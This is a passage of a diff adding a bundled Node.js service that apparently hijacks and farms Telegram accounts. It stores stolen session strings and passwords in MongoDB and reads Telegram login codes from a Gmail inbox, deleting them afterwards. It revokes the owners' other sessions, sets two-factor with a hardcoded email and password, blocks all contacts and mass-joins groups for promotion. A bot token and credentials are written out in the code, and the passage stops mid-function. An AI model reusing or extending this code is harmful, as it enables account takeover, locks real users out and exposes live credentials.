+    // Function to upload files from URLs to a specific folder in Cloudinary
+    async uploadFilesToFolder(folderName) {
+        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {
+            try {
+                const result = await cloudinary.v2.uploader.upload_large(url, {
+                    folder: folderName,
+                    resource_type: 'auto',
+                    public_id: key, // Set the key as the public_id
+                });
+
+                return result;
+            } catch (error) {
+                console.error('Error uploading file:', error);
+                throw error;
+            }
+        });
+
+        try {
+            return await Promise.all(uploadPromises);
+        } catch (error) {
+            console.error('Error uploading files:', error);
+            throw error;
+        }
+    }
+
+    async printResources() {
+        try {
+            this.resources?.forEach((val, key) => {
+                console.log(key, ":", val);
+            })
+        } catch (error) {
+            console.log(error);
+        }
+    }
+
+    get(publicId) {
+        try {
+            const result = this.resources.get(publicId)
+            return result || '';
+        } catch (error) {
+            console.log(error);
+        }
+    }
+
+    getBuffer(publicId) {
+        try {
+            const result = this.resources.get(publicId)
+            return result || '';
+        } catch (error) {
+            console.log(error);
+        }
+    }
+}
+
+async function saveFile(url, name) {
+    const extension = url.substring(url.lastIndexOf('.') + 1, url.length);
+    const mypath = path.resolve(__dirname, `./${name}.${extension}`);
+    fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2)
+        .then(res => {
+            if (res?.statusText === 'OK') {
+                try {
+                    if (!fs.existsSync(mypath)) {
+                        fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file
+                        console.log(`${name}.${extension} Saved!!`);
+                    } else {
+                        fs.unlinkSync(mypath);
+                        fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file
+                        console.log(`${name}.${extension} Replaced!!`);
+                    }
+                } catch (err) {
+                    console.error(err);
+                }
+            } else {
+                throw new Error(`Unable to download file from ${url}`);
+            }
+        }).catch(err => {
+            console.error(err);
+        });
+}
+
+module.exports = { CloudinaryService }
+
+
+
+
+
+/***/ }),
+
+/***/ "./dbservice.js":
+/*!**********************!*\
+  !*** ./dbservice.js ***!
+  \**********************/
+/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
+
+const { MongoClient, ServerApiVersion } = __webpack_require__(/*! mongodb */ "mongodb")
+
+class ChannelService {
+    static instance;
+    client = undefined
+    db = undefined;
+    users = undefined;
+    statsDb = undefined;
+    statsDb2 = undefined;
+    isConnected = false;
+
+    constructor () {
+    }
+
+    static getInstance() {
+        if (!ChannelService.instance) {
+            ChannelService.instance = new ChannelService();
+        }
+        return ChannelService.instance;
+    }
+    static isInstanceExist() {
+        return !!ChannelService.instance;
+    }
+
+    async connect() {
+        if (!this.isConnected) {
+            console.log('trying to connect to DB......')
+            try {
+                this.client = await MongoClient.connect(process.env.mongouri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: ServerApiVersion.v1, maxPoolSize: 15 });
+                console.log('Connected to MongoDB');
+                this.isConnected = true;
+                this.client.on('close', () => {
+                    console.log('MongoDB connection closed.');
+                    this.isConnected = false;
+                });
+                this.db = this.client.db("tgclients").collection('channels');
+                this.users = this.client.db("tgclients").collection('users');
+                this.statsDb = this.client.db("tgclients").collection('stats');
+                this.statsDb2 = this.client.db("tgclients").collection('stats2');
+                return true;
+            } catch (error) {
+                console.log(`Error connecting to MongoDB: ${error}`);
+                return false;
+            }
+        } else {
+            console.log('MongoConnection ALready Existing');
+        }
+    }
+    async insertChannel(channelData) {
+        const {
+            title,
+            id,
+            username,
+            megagroup,
+            participantsCount,
+            restricted,
+            broadcast
+        } = channelData
+        const cannotSendMsgs = channelData.defaultBannedRights?.sendMessages
+        if (!cannotSendMsgs && !broadcast) {
+            await this.db.updateOne({ channelId: id.toString() }, { $set: { username: username, title, megagroup, participantsCount, broadcast, restricted, sendMessages: channelData.defaultBannedRights?.sendMessages, canSendMsgs: true } }, { upsert: true });
+        }
+    }
+    async getChannels(limit = 50, skip = 0, k) {
+        const query = { megagroup: true, username: { $ne: null } };
+        const sort = { participantsCount: -1 };
+        if (k) {
+            query["$or"] = [{ title: { $regex: k, $options: 'i' } }, { username: { $regex: k, $options: 'i' } }]
+        }
+        const options = { collation: { locale: 'en', strength: 1 } };
+        try {
+            if (k) {
+                await this.db?.createIndex({ title: 'text' }); // Create index on the "title" field for text search
+            }
+            const result = await this.db
+                .find(query, options)
+                .sort(sort)
+                .skip(skip)
+                .limit(limit)
+                .toArray();
+
+            return result;
+        } catch (error) {
+            console.error('Error:', error);
+            return [];
+        }
+    }
+
+    async insertUser(user) {
+        const filter = { mobile: user.mobile };
+        try {
+            const entry = await this.users.findOne(filter);
+            if (!entry) {
+                await this.users.insertOne(user);
+            }
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async updateUser(user, data) {
+        const filter = { mobile: user.mobile };
+        try {
+            const entry = await this.users.updateOne(filter, {
+                $set: {
+                    ...data
+                },
+            }, { upsert: true });
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async resetPaidUsers() {
+        try {
+            const collection = this.client.db("tgclients").collection('userData');
+            const entry = await collection.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 50 } }] }, {
+                $set: {
+                    totalCount: 10,
+                    limitTime: Date.now()
+                }
+            });
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async deleteUser(user) {
+        const filter = { mobile: user.mobile };
+        try {
+            const entry = await this.users.deleteOne(filter);
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async getUser(user) {
+        const filter = { mobile: user.mobile };
+        try {
+            const entry = await this.users.findOne(filter);
+            return entry
+        } catch (error) {
+            console.log(error)
+            return undefined
+        }
+    }
+
+    async getuserdata(filter) {
+        try {
+            const collection = this.client.db("tgclients").collection('userData');
+            const entry = await collection.findOne(filter);
+            return entry
+        } catch (error) {
+            console.log(error)
+            return undefined
+        }
+    }
+
+    async updateUserData(filter, data) {
+        try {
+            const collection = this.client.db("tgclients").collection('userData');
+            const entry = await collection.updateMany(filter, { $set: { ...data } });
+            return entry
+        } catch (error) {
+            console.log(error)
+            return undefined
+        }
+    }
+
+    async getTempUser() {
+        try {
+            const entry = await this.users.findOne({});
+            return entry
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async getUsersFullData(limit = 2, skip = 0) {
+        const result = await this.users?.find({}).skip(skip).limit(limit).sort({ _id: 1 }).toArray();
+        if (result) {
+            return result;
+        } else {
+            return undefined;
+        }
+    }
+
+    async insertInBufferClients(user) {
+        const filter = { mobile: user.mobile };
+        try {
+            const bufferColl = this.client.db("tgclients").collection('bufferClients');
+            await bufferColl.updateOne(filter, { $set: { ...user } }, { upsert: true });
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async readBufferClients(filter, limit) {
+        const bufferColl = this.client.db("tgclients").collection('bufferClients');
+        const query = filter || {};
+        const queryWithLimit = limit ? bufferColl.find(query).limit(limit) : bufferColl.find(query);
+        const result = await queryWithLimit.toArray();
+        if (result?.length > 0) {
+            return result;
+        } else {
+            return [];
+        }
+    }
+
+
+    async getOneBufferClient(mobile = null) {
+        const bufferColl = this.client.db("tgclients").collection('bufferClients');
+        const today = new Date().toISOString().split('T')[0]
+        const query = { date: { $lte: today } }
+        if (mobile) {
+            query['mobile'] = mobile
+        }
+        const results = await bufferColl.find(query).toArray();
+        if (results.length) {
+            for (const result of results) {
+                if (result) {
+                    const alreadyExist = await this.getUserConfig({ number: `+${result.mobile}` });
+                    if (!alreadyExist) {
+                        return result
+                    } else {
+                        console.log("removing one already existing client");
+                        const entry = await bufferColl.deleteMany({ mobile: result.mobile });
+                    }
+                } else {
+                    return undefined;
+                }
+            }
+        } else {
+            return undefined
+        }
+    }
+
+    async deleteBufferClient(user) {
+        const filter = { mobile: user.mobile };
+        const bufferColl = this.client.db("tgclients").collection('bufferClients');
+        try {
+            const entry = await bufferColl.deleteOne(filter);
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async getNewBufferClients(ids) {
+        const cursor = this.users.find({ "mobile": { $nin: ids }, twoFA: { $exists: false } }).sort({ lastActive: 1 }).limit(20);
+        return cursor
+    }
+
+    async readPromoteStats() {
+        const promotColl = this.client.db("tgclients").collection('promoteStats');
+        const result = await promotColl.find({}, { projection: { "client": 1, "totalCount": 1, "lastUpdatedTimeStamp": 1, "isActive": 1, "_id": 0 } }).sort({ totalCount: -1 }).toArray();
+        if (result.length > 0) {
+            return result;
+        } else {
+            return undefined;
+        }
+    }
+
+    async checkIfPaidToOthers(chatId, profile) {
+        const resp = { paid: 0, demoGiven: 0 };
+        try {
+            const collection = this.client.db("tgclients").collection('userData');
+            const document = await collection.find({ chatId, profile: { $exists: true, "$ne": profile }, payAmount: { $gte: 10 } }).toArray();
+            const document2 = await collection.find({ chatId, profile: { $exists: true, "$ne": profile }, demoGiven: true }).toArray();
+            if (document.length > 0) {
+                resp.paid = document.length
+            }
+            if (document2.length > 0) {
+                resp.demoGiven = document2.length
+            }
+        } catch (error) {
+            console.log(error);
+        }
+        return resp;
+    }
+
+
+    async readSinglePromoteStats(clientId) {
+        const promotColl = this.client.db("tgclients").collection('promoteStats');
+        const result = await promotColl.findOne({ client: clientId }, { projection: { "client": 1, "totalCount": 1, "lastUpdatedTimeStamp": 1, "isActive": 1, "_id": 0 } });
+        return result
+    }
+
+    async readStats() {
+        const result = await this.statsDb.find({}).sort({ newUser: -1 })
+        if (result) {
+            return result.toArray();
+        } else {
+            return undefined;
+        }
+    }
+
+    async read(chatId) {
+        const result = await this.db.findOne({ chatId });
+        if (result) {
+            return result;
+        } else {
+            return undefined;
+        }
+    }
+    async removeOnefromChannel(filter) {
+        try {
+            await this.db.deleteOne(filter)
+        } catch (e) {
+            console.log(e)
+        }
+    }
+
+    async getUsers(limit, skip = 0) {
+        const result = await this.users?.find({}, { projection: { firstName: 1, userName: 1, mobile: 1, _id: 0 } }).skip(skip).limit(limit).toArray();
+        if (result) {
+            return result;
+        } else {
+            return undefined;
+        }
+    }
+
+    async getupi(key) {
+        const upiDb = this.client.db("tgclients").collection('upi-ids');
+        const upiIds = await upiDb.findOne({});
+        return upiIds[key] || "lakshmi-69@paytm"
+    }
+
+    async getAllUpis() {
+        const upiDb = this.client.db("tgclients").collection('upi-ids');
+        const upiIds = await upiDb.findOne({});
+        return upiIds
+    }
+
+    async updateUpis(data) {
+        const upiDb = this.client.db("tgclients").collection('upi-ids');
+        const upiIds = await upiDb.updateOne({}, { $set: { ...data } });
+        return upiIds
+    }
+
+    async getBuilds() {
+        const buildBd = this.client.db("tgclients").collection('builds');
+        const builds = await buildBd.findOne({});
+        return builds
+    }
+
+    async updateBuilds(data) {
+        const buildBd = this.client.db("tgclients").collection('builds');
+        const builds = await buildBd.updateOne({}, { $set: { ...data } }, { upsert: true });
+        return builds
+    }
+
+    async getUserConfig(filter) {
+        const clientDb = this.client.db("tgclients").collection('clients');
+        const client = await clientDb.findOne(filter);
+        return client
+    }
+    async getUserInfo(filter) {
+        const clientDb = this.client.db("tgclients").collection('clients');
+        const aggregationPipeline = [
+            { $match: filter },
+            {
+                $project: {
+                    "_id": 0,
+                    "session": 0,
+                    "number": 0,
+                    "password": 0,
+                }
+            }
+        ];
+        const result = await clientDb.aggregate(aggregationPipeline).toArray();
+        return result.length > 0 ? result[0] : null;
+    }
+    async updateUserConfig(filter, data) {
+        const upiDb = this.client.db("tgclients").collection('clients');
+        const updatedDocument = await upiDb.findOneAndUpdate(filter, { $set: { ...data } }, { returnOriginal: false });
+        return updatedDocument.value;
+    }
+
+    async insertInAchivedClient(data) {
+        const upiDb = this.client.db("tgclients").collection('ArchivedClients');
+        const upiIds = await upiDb.updateOne({ number: data.number }, { $set: { ...data } }, { upsert: true });
+        return upiIds
+    }
+
+    async getInAchivedClient(filter) {
+        const upiDb = this.client.db("tgclients").collection('ArchivedClients');
+        const upiIds = await upiDb.findOne(filter)
+        return upiIds
+    }
+
+    async removeOneAchivedClient(filter) {
+        const upiDb = this.client.db("tgclients").collection('ArchivedClients');
+        const upiIds = await upiDb.deleteOne(filter)
+        return upiIds
+    }
+
+    async getAllUserClients() {
+        const clientDb = this.client.db("tgclients").collection('clients');
+        const clients = await clientDb.aggregate([
+            {
+                $project: {
+                    "_id": 0,
+                    "session": 0,
+                    "number": 0,
+                    "password": 0,
+                }
+            }
+        ]).toArray();
+        return clients;
+    }
+
+    async getTgConfig() {
+        const clientDb = this.client.db("tgclients").collection('configuration');
+        const client = await clientDb.findOne({ "apiId": "1591339" });
+        return client
+    }
+
+    async updateTgConfig(data) {
+        const upiDb = this.client.db("tgclients").collection('configurations');
+        const upiIds = await upiDb.updateOne({}, { $set: { ...data } });
+        return upiIds
+    }
+
+    async processUsers(limit = undefined, skip = undefined) {
+        const weekAgo = new Date(Date.now() - (60 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0]
+        const cursor = this.users.find({
+            $or: [
+                { "lastUpdated": { $lt: weekAgo } },
+                { "lastUpdated": { $exists: false } }
+            ]
+        }).limit(limit ? limit : 300).skip(skip ? skip : 0);
+        return cursor;
+    }
+
+    async clearStats() {
+        const result = await this.statsDb.deleteMany({ "payAmount": { $lt: 5 } });
+        console.log(result);
+    }
+
+    async clearStats2() {
+        const result = await this.statsDb2?.deleteMany({});
+        console.log(result);
+    }
+
+    async reinitPromoteStats() {
+        const promotColl = this.client.db("tgclients").collection('promoteStats');
+        const users = await this.getAllUserClients();
+        for (const user of users) {
+            await promotColl.updateOne({ client: user.clientId },
+                {
+                    $set: {
+                        data: Object.fromEntries((await promotColl.findOne({ client: user.clientId })).channels?.map(channel => [channel, 0])),
+                        totalCount: 0,
+                        uniqueChannels: 0,
+                        releaseDay: Date.now(),
+                        lastupdatedTimeStamp: Date.now()
+                    }
+                });
+        }
+    }
+
+    async closeConnection() {
+        try {
+            if (this.isConnected) {
+                this.isConnected = false;
+                console.log('MongoDB connection closed.');
+            }
+            await this.client?.close();
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async getCurrentActiveUniqueChannels() {
+        const promoteStatsColl = this.client.db("tgclients").collection('promoteStats');
+
+        const cursor = promoteStatsColl.find({});
+        const uniqueChannels = new Set();
+
+        await cursor.forEach((document) => {
+            for (const channel in document.data) {
+                uniqueChannels.add(channel);
+            }
+        });
+
+        const uniqueChannelNames = Array.from(uniqueChannels);
+        return uniqueChannelNames;
+    }
+
+    async getActiveChannels(limit = 50, skip = 0, keywords = [], notIds = [], collection = 'activeChannels') {
+        const pattern = new RegExp(keywords.join('|'), 'i');
+        const notPattern = new RegExp('online|board|class|PROFIT|@wholesale|retail|topper|exam|medico|traini|cms|cma|subject|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', "i")
+        let query = {
+            $and: [
+                { username: { $ne: null } },
+                {
+                    $or: [
+                        { title: { $regex: pattern } },
+                        { username: { $regex: pattern } }
+                    ]
+                },
+                {
+                    username: {
+                        $not: {
+                            $regex: "^(" + notIds.map(id => "(?i)" + id?.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))?.join("|") + ")$"
+                        }
+                    }
+                },
+                {
+                    title: { $not: { $regex: notPattern } }
+                },
+                {
+                    username: { $not: { $regex: notPattern } }
+                },
+                {
+                    sendMessages: false,
+                    broadcast: false,
+                    restricted: false
+                }
+            ]
+        };
+
+        const sort = { participantsCount: -1 };
+        const promoteStatsColl = this.client.db("tgclients").collection(collection);
+        try {
+            const result = await promoteStatsColl
+                .find(query)
+                .sort(sort)
+                .skip(skip)
+                .limit(limit)
+                .toArray();
+
+            return result;
+        } catch (error) {
+            console.error('Error:', error);
+            return [];
+        }
+    }
+
+    async updateActiveChannels() {
+        try {
+            const promoteStatsColl = this.client.db("tgclients").collection('promoteStats');
+            const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
+            const channelInfoCollection = this.client.db("tgclients").collection('channels');
+            const cursor = promoteStatsColl.find({});
+
+            await cursor.forEach(async (document) => {
+                for (const channelId in document.data) {
+                    const channelInfo = await channelInfoCollection.findOne({ channelId }, { projection: { "_id": 0 } });
+                    if (channelInfo) {
+                        await activeChannelCollection.updateOne({ channelId }, { $set: channelInfo }, { upsert: true });
+                    }
+                }
+            });
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async updateActiveChannel(id, data) {
+        const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
+        await activeChannelCollection.updateOne({ channelId: id }, { $set: data }, { upsert: true })
+    }
+
+    async removeOnefromActiveChannel(filter) {
+        try {
+            const activeChannelCollection = this.client.db("tgclients").collection('activeChannels');
+            await activeChannelCollection.deleteOne(filter)
+        } catch (e) {
+            console.log(e)
+        }
+    }
+}
+
+module.exports = ChannelService;
+
+/***/ }),
+
+/***/ "./mailreader.js":
+/*!***********************!*\
+  !*** ./mailreader.js ***!
+  \***********************/
+/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
+
+const Imap = __webpack_require__(/*! imap */ "imap");
+console.log("Started Mail Reader")
+let isReady = false;
+
+function isMailReady() {
+    return isReady;
+}
+
+const imap = new Imap({
+    user: process.env.GMAIL_ADD,
+    password: process.env.GMAIL_PASS,
+    host: 'imap.gmail.com',
+    port: 993,
+    tls: true,
+    tlsOptions: {
+        rejectUnauthorized: false
+    }
+
+});
+
+async function openInbox(cb) {
+    imap.openBox('INBOX', false, cb);
+}
+
+imap.once('ready', function () {
+    console.log("ready")
+    isReady = true;
+    return true
+});
+
+imap.once('error', (err) => {
+    console.error("SomeError :", err);
+});
+
+imap.once('end', () => {
+    console.log('Connection ended');
+});
+let result = ''
+async function getcode() {
+    await openInbox(() => {
+        const searchCriteria = [['FROM', 'noreply@telegram.org']];
+        const fetchOptions = {
+            bodies: ['HEADER', 'TEXT'],
+            markSeen: true,
+        };
+        imap.search(searchCriteria, (err, results) => {
+            if (err) throw err;
+            console.log(results)
+            if (results.length > 0) {
+                const fetch = imap.fetch([results[results.length - 1]], fetchOptions);
+                fetch.on('message', (msg, seqno) => {
+                    const emailData = [];
+
+                    msg.on('body', (stream, info) => {
+                        let buffer = '';
+
+                        stream.on('data', (chunk) => {
+                            buffer += chunk.toString('utf8');
+                        });
+
+                        stream.on('end', () => {
+                            if (info.which === 'TEXT') {
+                                emailData.push(buffer);
+                            }
+                            imap.seq.addFlags([seqno], '\\Deleted', (err) => {
+                                if (err) throw err;
+                                imap.expunge((err) => {
+                                    if (err) throw err;
+                                    console.log(`Deleted message`);
+                                });
+                            });
+                        });
+                    });
+
+                    msg.once('end', () => {
+                        console.log(`Email #${seqno}, Latest${results[results.length - 1]}`);
+                        console.log("EmailDataLength: ", emailData.length);
+                        console.log("Mail:", emailData[emailData.length - 1].split('.'));
+                        result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0])
+                    });
+                });
+                fetch.once('end', () => {
+                    console.log("fetched mails")
+                });
+            }
+        });
+    });
+    console.log("Returning from mail Reader:", result);
+    if (result.length > 4) {
+        imap.end();
+    }
+    return result
+}
+
+function fetchNumbersFromString(inputString) {
+    const regex = /\d+/g;
+    const matches = inputString.match(regex);
+    if (matches) {
+        const result = matches.join('');
+        return result;
+    } else {
+        return '';
+    }
+}
+function connectToMail() {
+    result = '';
+    imap.connect();
+}
+function disconnectfromMail() {
+    result = '';
+    imap.end();
+}
+module.exports = { getcode, isMailReady, connectToMail, disconnectfromMail }
+
+
+/***/ }),
+
+/***/ "./swaggerConfig.js":
+/*!**************************!*\
+  !*** ./swaggerConfig.js ***!
+  \**************************/
+/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
+
+const swaggerJsdoc = __webpack_require__(/*! swagger-jsdoc */ "swagger-jsdoc");
+
+const options = {
+  definition: {
+    openapi: '3.0.0',
+    info: {
+      title: 'ReddyGirl',
+      version: '1.0.0',
+      description: 'API documentation for your Express application',
+    },
+  },
+  apis: ['./index.js'], 
+};
+
+const swaggerSpec = swaggerJsdoc(options);
+
+module.exports = swaggerSpec;
+
+
+/***/ }),
+
+/***/ "./telegramManager.js":
+/*!****************************!*\
+  !*** ./telegramManager.js ***!
+  \****************************/
+/***/ ((module, __unused_webpack_exports, __webpack_require__) => {
+
+const { TelegramClient, Api } = __webpack_require__(/*! telegram */ "telegram");
+const { NewMessage } = __webpack_require__(/*! telegram/events/index.js */ "telegram/events/index.js");
+const axios = __webpack_require__(/*! axios */ "axios");
+const { StringSession } = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
+const { isMailReady, getcode, connectToMail, disconnectfromMail } = __webpack_require__(/*! ./mailreader */ "./mailreader.js")
+const ppplbot = "https://api.telegram.org/bot6877935636:AAGsHAU-O2B2klPMwDrr0PfkBHXib74K1Nc/sendMessage";
+const { CustomFile } = __webpack_require__(/*! telegram/client/uploads */ "telegram/client/uploads");
+const { sleep } = __webpack_require__(/*! ./utils */ "./utils.js")
+const fs = __webpack_require__(/*! fs */ "fs");
+const ChannelService = __webpack_require__(/*! ./dbservice */ "./dbservice.js");
+
+const clients = new Map();
+
+let activeClientSetup = undefined
+function getActiveClientSetup() {
+    return activeClientSetup;
+}
+
+function setActiveClientSetup(data) {
+    activeClientSetup = data
+}
+
+function getClient(number) {
+    return clients.get(number);
+}
+
+function hasClient(number) {
+    return clients.has(number);
+}
+
+async function deleteClient(number) {
+    const cli = getClient(number);
+    await cli?.disconnect();
+    return clients.delete(number);
+}
+
+async function disconnectAll() {
+    const data = clients.entries();
+    console.log("Disconnecting All Clients");
+    for (const [phoneNumber, client] of data) {
+        try {
+            await client?.disconnect();
+            clients.delete(phoneNumber);
+            console.log(`Client disconnected: ${phoneNumber}`);
+        } catch (error) {
+            console.log(error);
+            console.log(`Failed to Disconnect : ${phoneNumber}`);
+        }
+    }
+}
+
+
+async function createClient(number, session, autoDisconnect = true) {
+    if (!clients.has(number)) {
+        return new Promise(async (resolve) => {
+            const cli = new TelegramManager(session, number);
+            await cli.createClient(autoDisconnect);
+            if (cli.expired) {
+                clients.set(number, cli);
+            }
+            resolve(cli.expired);
+        });
+    } else {
+        return { msgs: 10, total: 10 }
+    }
+}
+
+
+class TelegramManager {
+    constructor(sessionString, phoneNumber) {
+        this.session = new StringSession(sessionString);
+        this.phoneNumber = phoneNumber;
+        this.client = null;
+        this.expired = false;
+        this.channelArray = []
+    }
+
+    async disconnect() {
+        await this.client.disconnect();
+        await this.client.destroy();
+        this.session.delete();
+    }
+
+    async createClient(autoDisconnect = true) {
+        try {
+            this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
+                connectionRetries: 5,
+            });
+            console.log("Stating Client - ", this.phoneNumber)
+            await this.client.connect();
+            // const msg = await this.client.sendMessage("777000", { message: "." });
+            // await msg.delete({ revoke: true });
+            const myMsgs = await this.client.getMessages('me', { limit: 8 });
+            if (autoDisconnect) {
+                setTimeout(async () => {
+                    if (this.client.connected || clients.get(this.phoneNumber)) {
+                        console.log("SELF destroy client");
+                        await this.client.disconnect();
+                        await this.client.destroy();
+                        this.session.delete();
+                    } else {
+                        console.log("Client Already Disconnected");
+                    }
+                    clients.delete(this.phoneNumber);
+                }, 180000)
+            } else {
+                const id = setInterval(async () => {
+                    if (!this.client.connected || !clients.has(this.phoneNumber)) {
+                        clearInterval(id);
+                    }
+                    await this.client.connect();
+                }, 20000);
+            }
+            this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new NewMessage());
+            console.log("Added event handler");
+            const chats = await this.client?.getDialogs({ limit: 500 });
+            console.log("TotalChats:", chats['total'])
+            this.expired = { msgs: myMsgs['total'], total: chats['total'] }
+        } catch (error) {
+            console.log(error);
+            this.expired = undefined;
+        }
+    }
+
+    async getLastMsgs(limit) {
+        const msgs = await this.client.getMessages("777000", { limit: parseInt(limit) });
+        let resp = ''
+        msgs.forEach((msg) => {
+            console.log(msg.text);
+            resp = resp + msg.text + "\n"
+        })
+        return (resp)
+    }
+    async channelInfo(sendIds = false) {
+        const chats = await this.client?.getDialogs({ limit: 600 });
+        let canSendTrueCount = 0;
+        let canSendFalseCount = 0;
+        let totalCount = 0
+        this.channelArray.length = 0;
+        console.log(chats["total"]);
+        chats.map(async (chat) => {
+            if (chat.isChannel || chat.isGroup) {
+                try {
+                    const chatEntity = await chat.entity.toJSON();
+                    const { broadcast, defaultBannedRights } = chatEntity;
+                    totalCount++;
+                    if (!broadcast && !defaultBannedRights?.sendMessages) {
+                        canSendTrueCount++;
+                        this.channelArray.push(chatEntity.username);
+                    } else {
+                        canSendFalseCount++;
+                    }
+                } catch (error) {
+                    console.log(error)
+                }
+            }
+        });
+        const responseObj = {
+            chatsArrayLength: totalCount,
+            canSendTrueCount,
+            canSendFalseCount,
+            ids: sendIds ? this.channelArray : []
+        };
+        return responseObj
+    }
+
+    async joinChannels(str) {
+        const db = ChannelService.getInstance();
+        const channels = str.split('|');
+        console.log(this.phoneNumber, " - channelsLen - ", channels.length)
+        for (let i = 0; i < channels.length; i++) {
+            if (!this.client.connected || !clients.has(this.phoneNumber)) {
+                break;
+            }
+            const channel = channels[i].trim();
+            console.log(this.phoneNumber, "Trying: ", channel)
+            try {
+                let joinResult = await this.client.invoke(
+                    new Api.channels.JoinChannel({
+                        channel: await this.client.getEntity(channel)
+                    })
+                );
+                console.log(this.phoneNumber, " - Joined channel Sucesss - ", channel)
+                try {
+                    const chatEntity = await this.client.getEntity(channel)
+                    const { title, id, broadcast, defaultBannedRights, participantsCount, restricted, username } = chatEntity;
+                    const entity = {
+                        id: id.toString(),
+                        title,
+                        participantsCount,
+                        username,
+                        restricted,
+                        broadcast,
+                        sendMessages: defaultBannedRights?.sendMessages,
+                        canSendMsgs: false,
+                    };
+                    if (!chatEntity.broadcast && !defaultBannedRights?.sendMessages) {
+                        entity.canSendMsgs = true;
+                        try {
+                            await db.updateActiveChannel(entity.id.toString(), entity);
+                            console.log("updated ActiveChannels");
+                        } catch (error) {
+                            console.log(error);
+                            console.log("Failed to update ActiveChannels");
+                        }
+                    } else {
+                        await db.removeOnefromActiveChannel({ channelId: entity.id.toString() });
+                        await db.removeOnefromChannel({ channelId: entity.id.toString() });
+                        console.log("Removed Cahnnel- ", channel)
+                    }
+                } catch (error) {
+                    console.log(this.phoneNumber, " - Failed - ", error)
+                }
+            } catch (error) {
+                console.log("Channels ERR: ", error);
+                if (error.toString().includes("No user has") || error.toString().includes("USERNAME_INVALID")) {
+                    await db.removeOnefromActiveChannel({ username: channel.replace("@", '') });
+                    await db.removeOnefromChannel({ username: channel });
+                    console.log("Removed Cahnnel- ", channel)
+                }
+                if (error.errorMessage === 'CHANNELS_TOO_MUCH' || error.errorMessage == "FLOOD") {
+                    await deleteClient(this.phoneNumber);
+                    break;
+                }
+            }
+            console.log(this.phoneNumber, " - On waiting period")
+            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
+            console.log(this.phoneNumber, " - Will Try next")
+        }
+        console.log(this.phoneNumber, " - finished joining channels")
+        await this.client.disconnect();
+        await deleteClient(this.phoneNumber);
+    }
+
+    async deleteChat(chatId) {
+        try {
+            const result = await this.client.invoke(
+                new Api.messages.DeleteChat({
+                    chatId: chatId,
+                })
+            );
+        } catch (error) {
+            console.log(error)
+        }
+    }
+    async removeOtherAuths() {
+        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
+        const updatedAuthorizations = result.authorizations.map((auth) => {
+            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
+                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
+                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
+                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
+                || auth.deviceModel.toLowerCase().includes('windows')) {
+                return auth;
+            } else {
+                this.client.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
+                return null;
+            }
+        }).filter(Boolean);
+        console.log(updatedAuthorizations);
+    }
+
+    async getAuths() {
+        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
+        return result
+    }
+
+    async hasPassword() {
+        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
+        return passwordInfo.hasPassword
+    }
+
+    async blockAllUsers() {
+        const chats = await this.client?.getDialogs({ limit: 600 });
+        for (let chat of chats) {
+            if (chat.isUser) {
+                await this.blockAUser(chat.id)
+            }
+            sleep(5000);
+        }
+    }
+
+    async blockAUser(id) {
+        const result = await this.client.invoke(
+            new Api.contacts.Block({
+                id: id,
+            })
+        );
+    }
+
+    async getLastActiveTime() {
+        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
+        let latest = 0
+        result.authorizations.map((auth) => {
+            if (!auth.country.toLowerCase().includes('singapore')) {
+                if (latest < auth.dateActive) {
+                    latest = auth.dateActive;
+                }
+            }
+        })
+        return latest
+    }
+
+    async getMe() {
+        const me = await this.client.getMe();
+        return me
+    }
+
+    async deleteProfilePhotos() {
+        try {
+            const result = await this.client.invoke(
+                new Api.photos.GetUserPhotos({
+                    userId: "me"
+                })
+            );
+            console.log(result)
+            if (result && result.photos?.length > 0) {
+                const res = await this.client.invoke(
+                    new Api.photos.DeletePhotos({
+                        id: result.photos
+                    }))
+            }
+            console.log("Deleted profile Photos");
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
+    async set2fa() {
+        connectToMail()
+        const intervalParentId = setInterval(async () => {
+            const isReady = isMailReady();
+            if (isReady) {
+                clearInterval(intervalParentId);
+                await this.client.updateTwoFaSettings({
+                    isCheckPassword: false,
+                    email: "storeslaksmi@gmail.com",
+                    hint: "password - India143",
+                    newPassword: "Ajtdmwajt1@",
+                    emailCodeCallback: async (length) => {
+                        console.log("code sent");
